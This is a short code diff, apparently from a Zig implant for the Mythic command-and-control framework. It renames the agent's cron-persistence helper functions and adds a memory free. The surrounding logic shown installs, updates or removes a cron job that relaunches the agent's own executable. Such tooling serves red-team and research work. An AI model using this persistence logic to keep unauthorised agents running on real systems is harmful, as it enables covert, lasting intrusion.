@@ -100,15 +100,16 @@ pub const MythicAgent = struct {
         } else {
             // Here is where we should check if a cron job exists for this exepath
             // If it doesn't, we install one
-            const cron_exists = try PersistUtils.get_cron_entries(self.allocator, self.io);
+            const cron_exists = try PersistUtils.getCronEntries(self.allocator, self.io);
             if (cron_exists == null or cron_exists.?.len == 0) {
-                PersistUtils.install_cron(exepath, self.allocator, self.io) catch |err| {
+                PersistUtils.installCron(exepath, self.allocator, self.io) catch |err| {
                     std.debug.print("{}", .{err});
                 };
             } else {
                 const cron_path = cron_exists.?;
+                defer self.allocator.free(cron_path);
                 if (!std.mem.eql(u8, cron_path, exepath)) {
-                    PersistUtils.update_cron_entry(cron_path, exepath, self.allocator, self.io) catch |err| {
+                    PersistUtils.updateCronEntry(cron_path, exepath, self.allocator, self.io) catch |err| {
                         std.debug.print("{}", .{err});
                     };
                 } else {
@@ -123,7 +124,7 @@ pub const MythicAgent = struct {
                     const exe_path = try std.process.executablePathAlloc(self.io, self.allocator);
                     defer self.allocator.free(exe_path);
 
-                    PersistUtils.remove_cron_entry(exe_path, self.allocator, self.io) catch |err| {
+                    PersistUtils.removeCronEntry(exe_path, self.allocator, self.io) catch |err| {
                         print("{}", .{err});
                     };
 
